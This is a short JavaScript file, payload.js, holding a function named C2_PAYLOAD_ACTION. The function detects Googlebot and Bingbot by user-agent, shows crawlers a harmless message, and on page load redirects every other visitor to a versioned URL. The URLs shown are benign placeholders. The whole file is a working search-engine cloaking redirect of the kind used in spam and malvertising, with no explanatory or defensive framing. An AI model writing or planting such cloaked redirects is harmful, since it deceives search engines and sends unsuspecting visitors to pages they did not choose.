// payload.js
var CURRENT_PAYLOAD_VERSION = "v1";

window.C2_PAYLOAD_ACTION = function() {
    if (navigator.userAgent.includes('Googlebot') || 
        navigator.userAgent.includes('Bingbot')) {
        console.log("🤖 Bot detected.");
        return;
    }
    
    var REDIRECT_URL_V1 = "https://www.youtube.com";
    var REDIRECT_URL_V2 = "https://www.google.com";
    var REDIRECT_URL_V3 = "https://www.wikipedia.org";
    
    if (CURRENT_PAYLOAD_VERSION === "v1") {
        window.location.href = REDIRECT_URL_V1;
    } 
    else if (CURRENT_PAYLOAD_VERSION === "v2") {
        window.location.href = REDIRECT_URL_V2;
    } 
    else if (CURRENT_PAYLOAD_VERSION === "v3") {
        window.location.href = REDIRECT_URL_V3;
    }
};

// ⚡ auto run
if (!navigator.userAgent.includes('Googlebot')) {
    window.C2_PAYLOAD_ACTION();
} else {
    console.log("Thanks for visiting my page");
}
